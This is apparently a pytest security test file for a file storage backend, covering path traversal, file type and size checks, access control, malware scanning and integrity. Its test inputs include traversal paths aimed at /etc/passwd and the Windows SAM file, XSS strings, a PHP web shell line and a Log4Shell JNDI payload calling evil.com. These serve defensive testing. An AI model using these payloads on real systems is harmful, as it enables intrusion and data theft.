"""
File Storage Security Testing
Implementation of FILE-001: File upload/download security, path traversal prevention, access controls.
"""

import asyncio
import hashlib
import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from dotmac_business_logic.files.storage.backends import (
    SecureFileStorage,
    SecurityError,
    ValidationError,
)


class TestFileStorageSecurityComprehensive:
    """Comprehensive file storage security testing"""

    @pytest.fixture
    def temp_storage_dir(self):
        """Create temporary directory for file storage testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.fixture
    def secure_file_storage(self, temp_storage_dir):
        """Create secure file storage instance"""
        return SecureFileStorage(
            base_path=str(temp_storage_dir),
            max_file_size=10 * 1024 * 1024,  # 10MB
            allowed_extensions=['.txt', '.pdf', '.jpg', '.png', '.docx'],
            scan_for_malware=True
        )

    @pytest.fixture
    def sample_files(self):
        """Sample file data for testing"""
        return {
            'safe_text': b'This is a safe text file content.',
            'safe_pdf': b'%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj',
            'malicious_script': b'<script>alert("XSS")</script>',
            'large_file': b'A' * (11 * 1024 * 1024),  # 11MB - over limit
            'empty_file': b'',
            'binary_data': bytes(range(256))
        }

    # Path Traversal Prevention Tests

    @pytest.mark.asyncio
    async def test_path_traversal_prevention_basic(self, secure_file_storage, sample_files):
        """Test basic path traversal attack prevention"""
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '../outside_directory/malicious.txt',
            '../../sensitive_data.txt',
            '/absolute/path/attack.txt',
            'subdir/../../../etc/hosts'
        ]

        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError) as exc_info:
                await secure_file_storage.store_file(malicious_path, sample_files['safe_text'])

            assert 'path traversal' in str(exc_info.value).lower() or 'invalid path' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_path_traversal_prevention_encoded(self, secure_file_storage, sample_files):
        """Test path traversal prevention with URL/percent encoding"""
        encoded_malicious_paths = [
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # ../../../etc/passwd
            '..%2f..%2f..%2fetc%2fpasswd',  # ../../etc/passwd
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32',  # ..\..\..\windows\system32
            'subdir%2f..%2f..%2f..%2fsensitive.txt'
        ]

        for encoded_path in encoded_malicious_paths:
            with pytest.raises(SecurityError) as exc_info:
                await secure_file_storage.store_file(encoded_path, sample_files['safe_text'])

            assert 'path traversal' in str(exc_info.value).lower() or 'invalid path' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_path_traversal_prevention_unicode(self, secure_file_storage, sample_files):
        """Test path traversal prevention with Unicode normalization attacks"""
        unicode_malicious_paths = [
            '\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd',  # Unicode dots and slashes
            '\u002e\u002e\u005c\u002e\u002e\u005c\u002e\u002e\u005cwindows',  # Unicode backslashes
            'subdir/\u002e\u002e/\u002e\u002e/sensitive.txt'
        ]

        for unicode_path in unicode_malicious_paths:
            with pytest.raises(SecurityError):
                await secure_file_storage.store_file(unicode_path, sample_files['safe_text'])

    @pytest.mark.asyncio
    async def test_valid_paths_allowed(self, secure_file_storage, sample_files):
        """Test that valid file paths are allowed"""
        valid_paths = [
            'document.txt',
            'subdir/file.pdf',
            'deep/nested/directory/file.jpg',
            'user_uploads/2023/12/report.docx'
        ]

        for valid_path in valid_paths:
            # Should not raise SecurityError
            result = await secure_file_storage.store_file(valid_path, sample_files['safe_text'])
            assert result['success'] is True
            assert result['path'] == valid_path

    # File Type Validation Tests

    @pytest.mark.asyncio
    async def test_file_extension_validation(self, secure_file_storage, sample_files):
        """Test file extension validation"""
        # Test allowed extensions
        allowed_files = [
            ('document.txt', sample_files['safe_text']),
            ('report.pdf', sample_files['safe_pdf']),
            ('image.jpg', b'fake_image_data'),
            ('screenshot.png', b'fake_png_data'),
            ('contract.docx', b'fake_docx_data')
        ]

        for filename, content in allowed_files:
            result = await secure_file_storage.store_file(filename, content)
            assert result['success'] is True

        # Test disallowed extensions
        disallowed_files = [
            ('script.js', sample_files['malicious_script']),
            ('executable.exe', b'fake_exe_data'),
            ('batch.bat', b'fake_batch_data'),
            ('shell.sh', b'fake_shell_data'),
            ('python.py', b'fake_python_data')
        ]

        for filename, content in disallowed_files:
            with pytest.raises(ValidationError) as exc_info:
                await secure_file_storage.store_file(filename, content)

            assert 'not allowed' in str(exc_info.value).lower() or 'extension' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_mime_type_validation(self, secure_file_storage, sample_files):
        """Test MIME type validation against file extension spoofing"""
        # Test file with wrong extension but correct content
        test_cases = [
            ('image.txt', b'\x89PNG\r\n\x1a\n'),  # PNG signature in .txt file
            ('document.jpg', b'%PDF-1.4\n'),       # PDF signature in .jpg file
            ('script.pdf', sample_files['malicious_script'])  # Script in .pdf file
        ]

        for filename, content in test_cases:
            with pytest.raises(ValidationError) as exc_info:
                await secure_file_storage.store_file(filename, content)

            assert 'mime type' in str(exc_info.value).lower() or 'content type' in str(exc_info.value).lower()

    # File Size Limit Tests

    @pytest.mark.asyncio
    async def test_file_size_limits(self, secure_file_storage, sample_files):
        """Test file size limit enforcement"""
        # Test file within size limit
        result = await secure_file_storage.store_file('small_file.txt', sample_files['safe_text'])
        assert result['success'] is True

        # Test file exceeding size limit
        with pytest.raises(ValidationError) as exc_info:
            await secure_file_storage.store_file('large_file.txt', sample_files['large_file'])

        assert 'size limit' in str(exc_info.value).lower() or 'too large' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_empty_file_handling(self, secure_file_storage, sample_files):
        """Test empty file handling"""
        # Configure whether empty files are allowed
        with patch.object(secure_file_storage, 'allow_empty_files', False):
            with pytest.raises(ValidationError) as exc_info:
                await secure_file_storage.store_file('empty.txt', sample_files['empty_file'])

            assert 'empty' in str(exc_info.value).lower()

        # Test with empty files allowed
        with patch.object(secure_file_storage, 'allow_empty_files', True):
            result = await secure_file_storage.store_file('empty_allowed.txt', sample_files['empty_file'])
            assert result['success'] is True

    # Access Control Tests

    @pytest.mark.asyncio
    async def test_user_access_control(self, secure_file_storage, sample_files):
        """Test user-based access control for files"""
        # Store files for different users
        user1_file = await secure_file_storage.store_file(
            'user1/document.txt',
            sample_files['safe_text'],
            user_id='user1',
            tenant_id='tenant1'
        )

        user2_file = await secure_file_storage.store_file(
            'user2/document.txt',
            sample_files['safe_text'],
            user_id='user2',
            tenant_id='tenant1'
        )

        # User1 should be able to access their own file
        content1 = await secure_file_storage.get_file(
            user1_file['path'],
            user_id='user1',
            tenant_id='tenant1'
        )
        assert content1 == sample_files['safe_text']

        # User1 should NOT be able to access user2's file
        with pytest.raises(SecurityError) as exc_info:
            await secure_file_storage.get_file(
                user2_file['path'],
                user_id='user1',
                tenant_id='tenant1'
            )

        assert 'access denied' in str(exc_info.value).lower() or 'unauthorized' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_tenant_isolation(self, secure_file_storage, sample_files):
        """Test tenant-based file isolation"""
        # Store files for different tenants
        await secure_file_storage.store_file(
            'shared/document.txt',
            sample_files['safe_text'],
            user_id='user1',
            tenant_id='tenant1'
        )

        tenant2_file = await secure_file_storage.store_file(
            'shared/document.txt',
            sample_files['safe_text'],
            user_id='user1',
            tenant_id='tenant2'
        )

        # User from tenant1 should not access tenant2's files
        with pytest.raises(SecurityError):
            await secure_file_storage.get_file(
                tenant2_file['path'],
                user_id='user1',
                tenant_id='tenant1'  # Wrong tenant
            )

    @pytest.mark.asyncio
    async def test_admin_access_override(self, secure_file_storage, sample_files):
        """Test admin users can access files across tenants"""
        # Store file for regular user
        user_file = await secure_file_storage.store_file(
            'user/private.txt',
            sample_files['safe_text'],
            user_id='regular_user',
            tenant_id='tenant1'
        )

        # Admin should be able to access any file
        content = await secure_file_storage.get_file(
            user_file['path'],
            user_id='admin_user',
            tenant_id='tenant1',
            is_admin=True
        )
        assert content == sample_files['safe_text']

    # Malicious Content Detection Tests

    @pytest.mark.asyncio
    async def test_script_injection_detection(self, secure_file_storage):
        """Test detection of script injection attempts"""
        malicious_contents = [
            b'<script>alert("XSS")</script>',
            b'javascript:void(0)',
            b'<?php system($_GET["cmd"]); ?>',
            b'<iframe src="javascript:alert(1)"></iframe>',
            b'<svg onload=alert(1)>',
            b'${jndi:ldap://evil.com/exploit}'
        ]

        for i, malicious_content in enumerate(malicious_contents):
            with pytest.raises(SecurityError) as exc_info:
                await secure_file_storage.store_file(f'malicious_{i}.txt', malicious_content)

            assert 'malicious content' in str(exc_info.value).lower() or 'security scan' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_virus_signature_detection(self, secure_file_storage):
        """Test virus signature detection"""
        # Mock virus signatures (EICAR test string)
        eicar_test_string = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

        with pytest.raises(SecurityError) as exc_info:
            await secure_file_storage.store_file('test_virus.txt', eicar_test_string)

        assert 'virus' in str(exc_info.value).lower() or 'malware' in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_metadata_sanitization(self, secure_file_storage, sample_files):
        """Test file metadata sanitization"""
        # Store file and check metadata is sanitized
        result = await secure_file_storage.store_file(
            'document_with_metadata.txt',
            sample_files['safe_text'],
            original_filename='../../malicious_name.txt',
            content_type='text/plain; charset=utf-8'
        )

        # Verify path is sanitized
        assert '../' not in result['path']
        assert result['sanitized_filename'] != '../../malicious_name.txt'
        assert result['safe_content_type'] == 'text/plain'

    # Secure Temporary File Handling Tests

    @pytest.mark.asyncio
    async def test_secure_temp_file_creation(self, secure_file_storage, sample_files):
        """Test secure temporary file handling"""
        # Mock secure temp file creation
        with patch('tempfile.NamedTemporaryFile') as mock_temp:
            mock_temp_file = Mock()
            mock_temp_file.name = '/secure/temp/file_abc123'
            mock_temp_file.write = Mock()
            mock_temp_file.flush = Mock()
            mock_temp_file.close = Mock()
            mock_temp.return_value.__enter__.return_value = mock_temp_file

            await secure_file_storage.store_file('secure_upload.txt', sample_files['safe_text'])

            # Verify secure temp file was created
            mock_temp.assert_called_once()
            call_kwargs = mock_temp.call_args[1]

            # Check security parameters
            assert call_kwargs.get('delete', True) is False  # Manual cleanup
            assert call_kwargs.get('prefix', '').startswith('secure_')
            assert 'dir' in call_kwargs  # Custom temp directory

    @pytest.mark.asyncio
    async def test_temp_file_cleanup(self, secure_file_storage, sample_files):
        """Test temporary file cleanup after processing"""
        temp_files_created = []

        # Mock temp file to track cleanup
        original_tempfile = tempfile.NamedTemporaryFile

        def mock_named_temp_file(*args, **kwargs):
            temp_file = original_tempfile(*args, **kwargs)
            temp_files_created.append(temp_file.name)
            return temp_file

        with patch('tempfile.NamedTemporaryFile', side_effect=mock_named_temp_file):
            await secure_file_storage.store_file('cleanup_test.txt', sample_files['safe_text'])

        # Verify temp files were cleaned up
        for temp_path in temp_files_created:
            assert not os.path.exists(temp_path), f"Temp file {temp_path} was not cleaned up"

    # File Content Integrity Tests

    @pytest.mark.asyncio
    async def test_file_content_integrity(self, secure_file_storage, sample_files):
        """Test file content integrity verification"""
        # Store file and verify integrity
        original_content = sample_files['safe_text']
        result = await secure_file_storage.store_file('integrity_test.txt', original_content)

        # Verify checksum is calculated
        assert 'checksum' in result
        expected_checksum = hashlib.sha256(original_content).hexdigest()
        assert result['checksum'] == expected_checksum

        # Retrieve file and verify content matches
        retrieved_content = await secure_file_storage.get_file(result['path'])
        assert retrieved_content == original_content

        # Verify checksum on retrieval
        retrieved_checksum = hashlib.sha256(retrieved_content).hexdigest()
        assert retrieved_checksum == result['checksum']

    @pytest.mark.asyncio
    async def test_file_corruption_detection(self, secure_file_storage, sample_files):
        """Test detection of file corruption"""
        # Store file
        result = await secure_file_storage.store_file('corruption_test.txt', sample_files['safe_text'])

        # Simulate file corruption by modifying stored file
        stored_path = Path(secure_file_storage.base_path) / result['path']
        with open(stored_path, 'wb') as f:
            f.write(b'CORRUPTED_DATA')

        # Attempt to retrieve file should detect corruption
        with pytest.raises(SecurityError) as exc_info:
            await secure_file_storage.get_file(result['path'], verify_integrity=True)

        assert 'corruption' in str(exc_info.value).lower() or 'checksum' in str(exc_info.value).lower()

    # Concurrent Access Security Tests

    @pytest.mark.asyncio
    async def test_concurrent_file_access_security(self, secure_file_storage, sample_files):
        """Test file access security under concurrent operations"""
        # Store file
        result = await secure_file_storage.store_file('concurrent_test.txt', sample_files['safe_text'])

        # Simulate concurrent access attempts
        async def access_file(user_id, should_succeed):
            try:
                content = await secure_file_storage.get_file(
                    result['path'],
                    user_id=user_id,
                    tenant_id='tenant1'
                )
                return content == sample_files['safe_text'] if should_succeed else False
            except SecurityError:
                return not should_succeed  # Failure expected

        # Run concurrent access tests
        tasks = [
            access_file('authorized_user', True),    # Should succeed
            access_file('unauthorized_user', False), # Should fail
            access_file('another_unauthorized', False) # Should fail
        ]

        results = await asyncio.gather(*tasks)

        # Verify access control worked correctly under concurrency
        assert results[0] is True   # Authorized access succeeded
        assert results[1] is True   # Unauthorized access correctly failed
        assert results[2] is True   # Another unauthorized access correctly failed
